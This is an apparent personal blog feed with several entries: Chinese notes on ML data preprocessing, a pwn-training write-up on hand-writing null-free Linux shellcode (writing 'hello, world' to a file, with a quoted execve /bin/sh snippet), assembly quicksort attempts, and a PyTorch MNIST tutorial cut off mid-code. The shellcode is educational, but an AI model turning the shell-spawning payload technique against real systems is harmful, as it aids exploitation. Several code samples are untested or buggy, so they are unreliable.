<li>该类数据缺失得太多了，干脆全部丢弃。</li>
<li>缺失得不多的话，可以利用均值或中位数补充少量数据。</li>
<li>利用其他的算法进行缺失数据的预测，做prediction然后补齐。</li>
</ol>
<h3 id="数据采样及均衡操作"><a href="#数据采样及均衡操作" class="headerlink" title="数据采样及均衡操作"></a>数据采样及均衡操作</h3><p>做分类任务的话，正负样本要求数量较均衡，如果给定数据不均衡的话就需要数据采样操作。</p>
<p>数据采样的操作主要有两种：上采样和下采样。</p>
<h4 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h4><p>当正负两类数据规模都比较大时，可以适当对数据多的那一类进行欠采样。</p>
<h4 id="上采样"><a href="#上采样" class="headerlink" title="上采样"></a>上采样</h4><p>当正负两类规模都比较小时，应该对数据少的那一类做过采样操作，经常可以用到一个叫SMOTE的过采样算法来合成新样本，使得两类规模相当。</p>
<h3 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h3><h4 id="数值数据"><a href="#数值数据" class="headerlink" title="数值数据"></a>数值数据</h4><p>针对普通数值型数据，一般可以使用MinMax或者标准化来做无量纲化操作。</p>
<p>这里的所谓标准化方法，就是处理出均值和方差，每个数据就表示成跟均值差了多少个方差（带正负符号）。</p>
<p>两种方法分别可以在<code>sklearn.preprocessing</code>的<code>StandardScaler</code>和<code>MinMaxScaler</code>找到。</p>
<h4 id="分类数据"><a href="#分类数据" class="headerlink" title="分类数据"></a>分类数据</h4><p>针对分类数据，经常需要转化成OneHot编码，这个操作可以在<code>pandas</code>或者<code>sklearn</code>里做到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder, LabelEncoder</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(&#123;<span class="string">&#x27;age&#x27;</span>: [<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>], <span class="string">&#x27;pet&#x27;</span>: [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># method 1</span></span><br><span class="line">pet_values = LabelEncoder.fit_transform(data.pet) <span class="comment"># [0, 1, 1, 2]，即离散化</span></span><br><span class="line">OneHotEncoder().fit_transform(pet_values.reshape(-<span class="number">1</span>, <span class="number">1</span>)).toarray()</span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">pd.get_dummies(data,columns=[<span class="string">&#x27;pet&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="时间数据"><a href="#时间数据" class="headerlink" title="时间数据"></a>时间数据</h4><p>时间数据最简便的是用<code>pandas</code>中的<code>DatetimeIndex</code>直接做。</p>
]]></content>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>First Assignment from Kap0k</title>
    <url>/2021/01/16/First-Assignment-from-Kap0k/</url>
    <content><![CDATA[<h2 id="手撕shellcode"><a href="#手撕shellcode" class="headerlink" title="手撕shellcode"></a>手撕shellcode</h2><p>最后的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x66\x69\x6c\x65\x68\x74\x65\x73\x74\x89\xe3\x50\x53\x31\xc9\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x68\x65\x6c\x6c\x89\xe1\x50\x51\x31\xd2\xb2\x0c\xb0\x04\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80</span><br></pre></td></tr></table></figure>
<h3 id="最初的思路"><a href="#最初的思路" class="headerlink" title="最初的思路"></a>最初的思路</h3><p>查了很久资料，最后才在google上找到有用的东西。（用i386编译出来的）</p>
<p>最简单的写法自然是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Hello, world!&quot;, 0xa</span><br><span class="line">    len equ $ - msg</span><br><span class="line">    filename db &quot;sb&quot;</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;xor edx, edx</span><br><span class="line">    mov ecx, 2</span><br><span class="line">    mov ebx, filename</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov ecx, msg</span><br><span class="line">    mov edx, 12</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
<p>这里所运用到的是linux kernel里面的syscall指令，通过<code>int 0x80</code>的软中断来执行底层函数。</p>
<p>我们用到的有<code>sys_open</code>和<code>sys_write</code>两个函数，他们的用法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">4.</span> sys_write</span><br><span class="line">Syntax: <span class="function"><span class="keyword">ssize_t</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/read_write.c</span><br><span class="line"></span><br><span class="line">Action: write to a file descriptor</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> sys_open</span><br><span class="line">Syntax: <span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> flags, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/open.c</span><br><span class="line"></span><br><span class="line">Action: open <span class="keyword">and</span> possibly create a file <span class="keyword">or</span> device</span><br><span class="line"></span><br><span class="line">Details:</span><br></pre></td></tr></table></figure>
<p><code>sys_open</code>的第二个参数<code>flags</code>中，<code>0</code>代表只读，<code>1</code>代表只写，<code>2</code>代表可读写。</p>
<p>这里试了一下，第三个参数可以不用去控制，默认留0没问题。</p>
<p>然后<code>sys_open</code>的返回值是一个文件描述数字，这个概念可以参考stdin是0，stdout是1，反正就是一个在<code>sys_write</code>调用的时候，第一个参数填的值。</p>
<p>然后就是照着规定填好寄存器，最后<code>int 0x80</code>调用一下就可以执行函数了。最后再<code>sys_exit</code>退出就可以了。</p>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf helloworld.asm</span><br><span class="line">$ ld -m elf_i386 -s -o shellcode helloworld.o</span><br></pre></td></tr></table></figure>
<p>不过这样编译过后会发现机器码里面一大堆都是<code>\x00</code>，不符合要求；并且存在常量字符串，没法在shellcode中跳到里面的奇妙地址来读取字符串。</p>
<h3 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h3><p>在搜索如何从汇编到shellcode的过程中，看到了一个教怎么弄出shell的教程，它的汇编是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor    %eax,%eax</span><br><span class="line">push   %eax</span><br><span class="line">push   $0x68732f2f</span><br><span class="line">push   $0x6e69622f</span><br><span class="line">mov    %esp,%ebx</span><br><span class="line">push   %eax</span><br><span class="line">push   %ebx</span><br><span class="line">mov    %esp,%ecx</span><br><span class="line">mov    $0xb,%al</span><br><span class="line">int    $0x80</span><br></pre></td></tr></table></figure>
<p>仔细研究它的写法，我们下面的解决方案就来自这段汇编的细节。（其实改编下就能用了）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="去除-x00"><a href="#去除-x00" class="headerlink" title="去除\x00"></a>去除\x00</h4><p>我们通过几个技巧来实现：</p>
<ol>
<li><code>mov eax, 0</code>转而通过<code>mov eax, eax</code>来实现。</li>
<li><code>mov eax, 1</code>转而通过<code>mov al, 1</code>来实现。（前提是eax高位也没问题）</li>
</ol>
<h4 id="在shellcode中注入常量字符串"><a href="#在shellcode中注入常量字符串" class="headerlink" title="在shellcode中注入常量字符串"></a>在shellcode中注入常量字符串</h4><p>我们没法把我们想要的字符串在被注入的程序中找到，所以还是得存在栈里面。</p>
<p>不过怎么存呢？通过push来存。</p>
<p>然后就有非常强的技巧：将字符串翻转后变成十六进制编码，每8位每8位的push进去，最后从栈顶开始的字符串就是我们想要的字符串。</p>
<p>但是又有问题：这样会不会又产生<code>\x00</code>？</p>
<p>其实有可能，所以我们无论如何，长度都补齐到4的整数倍。这样就可以保证没有<code>\x00</code>了。</p>
<p>最终我的shellcode输出至名字为<code>testfile</code>的文件中，输入内容为<code>hello, world</code>。</p>
<p>缺点是<code>testfile</code>必须要先存在然后才能写进去，这应该和我在<code>sys_open</code>的时候，<code>flags</code>的取值有关系。有时间的话再去探究这个参数到底该怎么取。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/First-Assignment-from-Kap0k/objdump.png">
<p>最后通过一个在网上找到的命令，直接提取出了机器码，生成了shellcode，省去了一个字节一个字节手抄出来的麻烦：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ objdump -d .&#x2F;shellcode|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
<h2 id="汇编快排"><a href="#汇编快排" class="headerlink" title="汇编快排"></a>汇编快排</h2><p>直接用汇编写出快排我做不到，就先写个c出来吧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *start, <span class="keyword">int</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = (end - start);</span><br><span class="line">    <span class="keyword">int</span> pivot = *(start + (len &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">int</span> *i = start, *j = end;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(*i &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(*j &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; end) qsort(i, end);</span><br><span class="line">    <span class="keyword">if</span>(start &lt; j) qsort(start, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    qsort(a, a + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来发现汇编里面要写指针的话就好麻烦，干脆重新改一改：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = a[mid];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i] &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(a[j] &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(a, i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; r) qsort(a, i, r);</span><br><span class="line">    <span class="keyword">if</span>(l &lt; j) qsort(a, l, j);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了师傅的代码，发现可以用r8到r11的这4个寄存器来存，顿时方便了很多。<del>本来还以为要一直存在栈上</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没编译过，不过觉得问题不大。但愿如此（x</p>
<p>Jan 17 upd：重新用熟悉的AT&amp;T语法自己手写了一遍汇编快排，这次用了指针，看上去比较清晰：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sarq %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rax), (%rbx)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rax), (%rcx)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span class="line">_swap:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %r9, %rbx</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %rcx, %r8</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    leaq (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/flyoutsan/article/details/62237779">https://blog.csdn.net/flyoutsan/article/details/62237779</a></p>
<p><a href="https://www.cnblogs.com/orlion/p/5765339.html">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
<p>还有CSAPP的Chapter 3。不愧是CSAPP。</p>
]]></content>
      <tags>
        <tag>Kap0k pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Learn MNIST in PyTorch from Scratch to CNN</title>
    <url>/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/</url>
    <content><![CDATA[<p>Today I spent nearly an afternoon to follow the tutorial on <a href="pytorch.org">pytorch.org</a>. So just recall what I have learnt here.</p>
<p>(all in PyTorch…)</p>
<h2 id="from-Scratch"><a href="#from-Scratch" class="headerlink" title="from Scratch"></a>from Scratch</h2><p>We first write our code without too many features of PyTorch so that we can gradually see what can be simplified when using PyTorch.</p>
<h3 id="Download-MNIST-Data"><a href="#Download-MNIST-Data" class="headerlink" title="Download MNIST Data"></a>Download MNIST Data</h3><p>data download link: <a href="https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz">https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz</a></p>
<p>After manually decompressing this file, we use <code>pickle</code> to read data.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br></pre></td></tr></table></figure>
<p>It’s worth mentioning that the second dimension of <code>XTrain</code> and <code>XTest</code> are 784, which is identical to 28 * 28.</p>
<p>Using <code>plt.imshow</code> and <code>plt.show</code> function, single data can be shown easily.</p>
<p>Here is the initial code implementing MNIST with few feature of PyTorch:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_softmax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - x.exp().<span class="built_in">sum</span>(-<span class="number">1</span>).log().unsqueeze(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log_softmax(X @ weights + bias)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nll</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -batch_z[<span class="built_in">range</span>(batch_y.shape[<span class="number">0</span>]), batch_y].mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loss_func = nll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_train_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTrain[start:end], YTrain[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_test_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTest[start:end], YTest[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">XTrain, YTrain, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XTest, YTest))</span><br><span class="line"></span><br><span class="line">weights = torch.randn(<span class="number">784</span>, <span class="number">10</span>) / math.sqrt(<span class="number">784</span>)</span><br><span class="line">weights.requires_grad_()</span><br><span class="line">bias = torch.zeros(<span class="number">10</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> weights, bias</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            start = iteration * batch_size</span><br><span class="line">            end = start + batch_size</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = forward(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                weights -= lr * weights.grad</span><br><span class="line">                bias -= lr * bias.grad</span><br><span class="line">                weights.grad.zero_()</span><br><span class="line">                bias.grad.zero_()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = forward(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">    num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># batch_x = XTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># batch_z = forward(batch_x)</span></span><br><span class="line">    <span class="comment"># print(batch_z[0], batch_z.shape)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># batch_y = YTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># print(loss_func(batch_z, batch_y))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print(accuracy(batch_z, batch_y))</span></span><br><span class="line"></span><br><span class="line">    batch_size = <span class="number">64</span></span><br><span class="line">    lr = <span class="number">0.05</span></span><br><span class="line">    max_epoch = <span class="number">20</span></span><br><span class="line">    max_iteration = math.ceil(num_train / batch_size)</span><br><span class="line">    train(max_epoch, max_iteration, batch_size, lr)</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span 